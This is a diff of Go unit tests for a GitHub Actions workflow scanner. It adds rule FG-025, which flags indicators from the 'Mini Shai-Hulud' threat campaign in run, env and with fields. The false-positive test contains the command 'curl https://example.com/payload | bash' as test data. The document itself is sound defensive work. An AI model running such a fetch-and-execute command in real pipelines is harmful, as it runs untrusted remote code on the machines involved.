@@ -384,11 +384,68 @@ func TestCheckGitHubEnvInjection_PushOutOfScope(t *testing.T) {
 	}
 }
 
+// --- FG-025: Known Threat-Actor IOC ---
+
+func TestCheckKnownIOCs(t *testing.T) {
+	wf, err := ParseWorkflowFile("../../test/fixtures/known-ioc.yaml")
+	if err != nil {
+		t.Fatalf("parse error: %v", err)
+	}
+	findings := CheckKnownIOCs(wf)
+	// Expect 3 hits: exfil-run (run block), env-marker (env value), with-marker (with input).
+	// The clean-job should produce 0 hits.
+	if len(findings) != 3 {
+		t.Fatalf("expected 3 findings, got %d: %v", len(findings), findings)
+	}
+
+	seenWhere := map[string]bool{}
+	for _, f := range findings {
+		if f.RuleID != "FG-025" {
+			t.Errorf("expected FG-025, got %s", f.RuleID)
+		}
+		if f.Severity != SeverityCritical {
+			t.Errorf("expected critical severity, got %s", f.Severity)
+		}
+		if !strings.Contains(f.Message, "Mini Shai-Hulud") {
+			t.Errorf("expected campaign tag in message, got: %s", f.Message)
+		}
+		switch {
+		case strings.Contains(f.Message, "run block"):
+			seenWhere["run"] = true
+		case strings.Contains(f.Message, "env."):
+			seenWhere["env"] = true
+		case strings.Contains(f.Message, "with."):
+			seenWhere["with"] = true
+		}
+	}
+	if !seenWhere["run"] || !seenWhere["env"] || !seenWhere["with"] {
+		t.Errorf("expected hits in run/env/with, got: %v", seenWhere)
+	}
+}
+
+func TestCheckKnownIOCs_NoFalsePositive(t *testing.T) {
+	wf := &Workflow{
+		Path: "test.yaml",
+		Jobs: map[string]Job{
+			"build": {
+				Steps: []Step{
+					{Run: "curl https://example.com/payload | bash", Env: map[string]string{"X": "hello"}},
+					{Uses: "actions/checkout@v4"},
+				},
+			},
+		},
+	}
+	findings := CheckKnownIOCs(wf)
+	if len(findings) != 0 {
+		t.Errorf("expected 0 findings for clean workflow, got %d: %v", len(findings), findings)
+	}
+}
+
 // --- AllRules completeness ---
 
 func TestAllRules_IncludesNewRules(t *testing.T) {
 	rules := AllRules()
-	expectedIDs := []string{"FG-018", "FG-019", "FG-020", "FG-021", "FG-022", "FG-023", "FG-024"}
+	expectedIDs := []string{"FG-018", "FG-019", "FG-020", "FG-021", "FG-022", "FG-023", "FG-024", "FG-025"}
 	for _, id := range expectedIDs {
 		if _, ok := rules[id]; !ok {
 			t.Errorf("AllRules() missing %s", id)
